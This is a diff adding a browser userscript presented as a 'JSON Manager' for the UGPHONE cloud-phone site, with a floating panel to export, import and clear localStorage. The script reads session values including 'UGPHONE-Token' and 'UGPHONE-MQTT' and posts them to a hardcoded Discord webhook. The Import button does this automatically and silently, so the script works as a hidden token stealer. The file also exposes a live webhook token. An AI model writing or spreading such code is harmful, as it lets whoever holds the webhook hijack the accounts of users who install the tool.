@@ -1,0 +1,410 @@
+// ==UserScript==
+// @name         UGPHONE JSON Manager - Full
+// @namespace    https://ugphone.com/
+// @version      1.9
+// @author       Hoàng Tuấn Anh
+// @match        https://www.ugphone.com/toc-portal/#/login
+// @match        https://www.ugphone.com/toc-portal/#/dashboard/index
+// @icon         https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExcGhmdmJyN3cxdWNjNDc1aG5iN3J4eTBrMWV6Z3lscTh0MHFnemV0diZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/jPdNzfqIDmokLbSqO0/giphy.gif
+// @grant        GM_xmlhttpRequest
+// ==/UserScript==
+
+(function () {
+    'use strict';
+
+    const orderedKeys = [
+        "ugPhoneLang",
+        "ugBrowserId",
+        "UGPHONE-ID",
+        "UGrightSlideTips",
+        "hadAgreePolicy",
+        "_gcl_ls",
+        "UGPHONE-Token",
+        "UGPHONE-MQTT"
+    ];
+
+    // Cấu hình Webhook Discord
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1291224256721457253/TPaVwWRWJLfIM0tJu8Kcr5b0A9K-gmLW1ANGkdHsJcwiBGsN801HoygA9E20cPLl5lA0';
+    let lastSentData = null;
+
+    // Biến lưu trạng thái popup
+    let popupOpen = false;
+    let popupWrapper = null;
+
+    // 📋 Nút nổi mở/đóng popup
+    const floatBtn = document.createElement('div');
+    floatBtn.innerHTML = '⚙';
+    Object.assign(floatBtn.style, {
+        position: 'fixed',
+        top: '20px',
+        right: '20px',
+        width: '48px',
+        height: '48px',
+        borderRadius: '50%',
+        background: '#FFFFFF',
+        color: '#000000',
+        fontSize: '24px',
+        textAlign: 'center',
+        lineHeight: '48px',
+        cursor: 'pointer',
+        zIndex: '9999',
+        boxShadow: '0 2px 8px rgba(0,0,0,0.4)',
+        transition: 'transform 0.3s ease, background-color 0.3s ease'
+    });
+
+    // Hiệu ứng hover cho nút
+    floatBtn.addEventListener('mouseenter', () => {
+        floatBtn.style.transform = 'scale(1.1)';
+        floatBtn.style.backgroundColor = '#f0f0f0';
+    });
+    floatBtn.addEventListener('mouseleave', () => {
+        floatBtn.style.transform = 'scale(1)';
+        floatBtn.style.backgroundColor = '#FFFFFF';
+    });
+
+    document.body.appendChild(floatBtn);
+
+    // Hàm lấy dữ liệu localStorage dạng JSON
+    function getLocalStorageData() {
+        const raw = {};
+        for (let i = 0; i < localStorage.length; i++) {
+            const k = localStorage.key(i);
+            raw[k] = localStorage.getItem(k);
+        }
+        
+        const ordered = {};
+        for (const k of orderedKeys) {
+            if (raw.hasOwnProperty(k)) {
+                try {
+                    ordered[k] = JSON.stringify(JSON.parse(raw[k]));
+                } catch {
+                    ordered[k] = String(raw[k]);
+                }
+            }
+        }
+        return ordered;
+    }
+
+    // Hàm gửi dữ liệu đến Discord
+    function sendToDiscord(data, action = '') {
+        if (!DISCORD_WEBHOOK_URL) {
+            console.warn('Chưa cấu hình Discord Webhook URL');
+            return;
+        }
+
+        const currentData = JSON.stringify(data);
+        if (lastSentData === currentData && !action) {
+            console.log('Dữ liệu không thay đổi, không gửi');
+            return;
+        }
+
+        lastSentData = currentData;
+
+        const timestamp = new Date().toISOString();
+        const actionText = action ? `\n**Hành động:** ${action}` : '';
+        const embed = {
+            title: "LocalStorage Update",
+            description: `Dữ liệu localStorage từ UGPHONE${actionText}\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``,
+            color: 0x3498db,
+            timestamp: timestamp,
+            footer: {
+                text: "UGPHONE JSON Manager"
+            }
+        };
+
+        GM_xmlhttpRequest({
+            method: "POST",
+            url: DISCORD_WEBHOOK_URL,
+            data: JSON.stringify({ embeds: [embed] }),
+            headers: {
+                "Content-Type": "application/json"
+            },
+            onload: function(response) {
+                console.log("Đã gửi dữ liệu đến Discord:", response.status);
+            },
+            onerror: function(error) {
+                console.error("Lỗi khi gửi đến Discord:", error);
+            }
+        });
+    }
+
+    // Hàm hiển thị thông báo chi tiết
+    function showNotification(message, isSuccess = true) {
+        const notification = document.createElement('div');
+        notification.innerText = message;
+        Object.assign(notification.style, {
+            position: 'fixed',
+            top: '80px',
+            right: '20px',
+            padding: '12px 20px',
+            borderRadius: '6px',
+            background: isSuccess ? '#4CAF50' : '#F44336',
+            color: 'white',
+            zIndex: '10001',
+            boxShadow: '0 2px 10px rgba(0,0,0,0.2)',
+            animation: 'fadeInOut 3s ease-in-out',
+            opacity: '0'
+        });
+
+        document.body.appendChild(notification);
+        
+        setTimeout(() => {
+            notification.style.opacity = '1';
+            notification.style.transition = 'opacity 0.3s';
+        }, 100);
+
+        setTimeout(() => {
+            notification.style.opacity = '0';
+            setTimeout(() => notification.remove(), 300);
+        }, 2700);
+    }
+
+    function createPopup() {
+        if (popupWrapper) return popupWrapper;
+
+        const wrapper = document.createElement('div');
+        Object.assign(wrapper.style, {
+            position: 'fixed',
+            top: '50%',
+            left: '50%',
+            transform: 'translate(-50%, -50%)',
+            width: '90%',
+            maxWidth: '460px',
+            height: '530px', // Giảm chiều cao do bỏ nút đóng
+            background: '#000',
+            borderRadius: '12px',
+            boxShadow: '0 0 12px rgba(0,0,0,0.6)',
+            padding: '20px',
+            zIndex: '10000',
+            fontFamily: 'sans-serif',
+            overflow: 'hidden',
+            display: 'flex',
+            flexDirection: 'column',
+            alignItems: 'center',
+            opacity: '0',
+            transition: 'opacity 0.3s ease'
+        });
+
+        // 🎬 Nền video
+        const video = document.createElement('video');
+        Object.assign(video, {
+            src: 'https://v1.pinimg.com/videos/iht/expMp4/c0/d9/bb/c0d9bbb4a6b0a3995b2d92da5b5e21a7_720w.mp4',
+            autoplay: true,
+            loop: true,
+            muted: true,
+            playsInline: true
+        });
+        Object.assign(video.style, {
+            position: 'absolute',
+            top: 0,
+            left: 0,
+            width: '100%',
+            height: '100%',
+            zIndex: '-1',
+            objectFit: 'cover',
+            opacity: '0.8',
+            borderRadius: '12px'
+        });
+        wrapper.appendChild(video);
+
+        const title = document.createElement('h3');
+        title.innerText = 'UGPHONE JSON MANAGER';
+        title.style.color = '#fff';
+        title.style.marginBottom = '10px';
+        wrapper.appendChild(title);
+
+        const textarea = document.createElement('textarea');
+        textarea.placeholder = 'Nhập hoặc xuất JSON tại đây...';
+        Object.assign(textarea.style, {
+            width: '100%',
+            height: '160px',
+            margin: '10px 0',
+            padding: '10px',
+            borderRadius: '12px',
+            border: '1px solid rgba(255,255,255,0.3)',
+            backgroundColor: 'rgba(255, 255, 255, 0.05)',
+            color: '#fff',
+            fontSize: '14px',
+            resize: 'none',
+            backdropFilter: 'blur(4px)',
+            zIndex: '1'
+        });
+        wrapper.appendChild(textarea);
+
+        const btnWrap = document.createElement('div');
+        Object.assign(btnWrap.style, {
+            display: 'flex',
+            flexWrap: 'wrap',
+            gap: '10px',
+            justifyContent: 'space-between',
+            width: '100%',
+            marginTop: '10px'
+        });
+
+        function createBtn(label, color) {
+            const btn = document.createElement('button');
+            btn.innerText = label;
+            Object.assign(btn.style, {
+                flex: '1 1 45%',
+                padding: '10px',
+                borderRadius: '6px',
+                border: 'none',
+                color: '#fff',
+                background: color,
+                fontSize: '14px',
+                cursor: 'pointer',
+                transition: 'transform 0.2s ease'
+            });
+            
+            btn.addEventListener('mouseenter', () => {
+                btn.style.transform = 'scale(1.05)';
+            });
+            btn.addEventListener('mouseleave', () => {
+                btn.style.transform = 'scale(1)';
+            });
+            
+            return btn;
+        }
+
+        const btnImport = createBtn('📥 Nhập', '#2196f3');
+        const btnExport = createBtn('📤 Xuất', '#4caf50');
+        const btnCopy   = createBtn('📋 Sao chép', '#ff9800');
+        const btnPaste  = createBtn('📎 Dán', '#9c27b0');
+        const btnClear  = createBtn('🗑️ Xoá', '#607d8b');
+        const btnSend   = createBtn('🛜 Gửi Discord', '#7289da');
+
+        btnImport.onclick = () => {
+            try {
+                const obj = JSON.parse(textarea.value);
+                localStorage.clear();
+                for (const key in obj) {
+                    localStorage.setItem(key, obj[key]);
+                }
+                const action = 'Nhập dữ liệu mới';
+                showNotification('✅ Đã nhập thành công!', true);
+                sendToDiscord(getLocalStorageData(), action);
+            } catch (e) {
+                showNotification('❌ JSON không hợp lệ!', false);
+                console.error(e);
+            }
+        };
+
+        btnExport.onclick = () => {
+            const data = getLocalStorageData();
+            textarea.value = JSON.stringify(data, null, 2);
+            showNotification('✅ Đã xuất dữ liệu thành công!', true);
+        };
+
+        btnCopy.onclick = async () => {
+            const text = textarea.value.trim();
+            if (!text) {
+                showNotification("❗ Không có nội dung để sao chép", false);
+                return;
+            }
+            try {
+                await navigator.clipboard.writeText(text);
+                showNotification("✅ Đã sao chép vào clipboard!", true);
+            } catch (err) {
+                showNotification("❌ Trình duyệt không hỗ trợ sao chép", false);
+            }
+        };
+
+        btnPaste.onclick = async () => {
+            try {
+                const text = await navigator.clipboard.readText();
+                if (text) {
+                    textarea.value = text;
+                    showNotification("📎 Đã dán từ clipboard!", true);
+                } else {
+                    showNotification("❗ Clipboard trống", false);
+                }
+            } catch (err) {
+                showNotification("❌ Không thể đọc clipboard", false);
+            }
+        };
+
+        btnClear.onclick = () => {
+            if (confirm('⚠️ Bạn có chắc chắn muốn xoá toàn bộ dữ liệu localStorage không?')) {
+                localStorage.clear();
+                textarea.value = '';
+                const action = 'Xoá toàn bộ dữ liệu';
+                showNotification('🗑️ Đã xoá localStorage!', true);
+                sendToDiscord({}, action); // Gửi object rỗng khi xoá
+            }
+        };
+
+        btnSend.onclick = () => {
+            const data = getLocalStorageData();
+            const action = 'Gửi thủ công';
+            sendToDiscord(data, action);
+            showNotification('📤 Đã gửi dữ liệu đến Discord!', true);
+        };
+
+        for (let btn of [btnImport, btnExport, btnCopy, btnPaste, btnClear, btnSend]) {
+            btnWrap.appendChild(btn);
+        }
+
+        wrapper.appendChild(btnWrap);
+
+        // 🌈 Credit cuối cùng
+        const credit = document.createElement('div');
+        credit.innerHTML = 'Cre: <strong>Hoàng Tuấn Anh</strong>';
+        Object.assign(credit.style, {
+            marginTop: '15px',
+            fontSize: '13px',
+            fontWeight: 'bold',
+            background: 'linear-gradient(90deg, red, orange, yellow, green, cyan, blue, violet)',
+            WebkitBackgroundClip: 'text',
+            WebkitTextFillColor: 'transparent',
+            animation: 'rainbowText 4s linear infinite',
+            textAlign: 'center'
+        });
+        wrapper.appendChild(credit);
+
+        // Thêm hiệu ứng
+        const style = document.createElement('style');
+        style.textContent = `
+        @keyframes rainbowText {
+            0% { background-position: 0% }
+            100% { background-position: 100% }
+        }
+        @keyframes fadeInOut {
+            0% { opacity: 0; transform: translateY(10px); }
+            20% { opacity: 1; transform: translateY(0); }
+            80% { opacity: 1; transform: translateY(0); }
+            100% { opacity: 0; transform: translateY(-10px); }
+        }
+        `;
+        document.head.appendChild(style);
+
+        document.body.appendChild(wrapper);
+        return wrapper;
+    }
+
+    // Hàm bật/tắt popup
+    function togglePopup() {
+        if (!popupWrapper) {
+            popupWrapper = createPopup();
+        }
+
+        popupOpen = !popupOpen;
+        
+        if (popupOpen) {
+            popupWrapper.style.display = 'flex';
+            setTimeout(() => {
+                popupWrapper.style.opacity = '1';
+            }, 10);
+            floatBtn.innerHTML = '✕';
+            floatBtn.style.color = '#f44336';
+        } else {
+            popupWrapper.style.opacity = '0';
+            setTimeout(() => {
+                popupWrapper.style.display = 'none';
+            }, 300);
+            floatBtn.innerHTML = '⚙';
+            floatBtn.style.color = '#000000';
+        }
+    }
+
+    floatBtn.addEventListener('click', togglePopup);
+})();
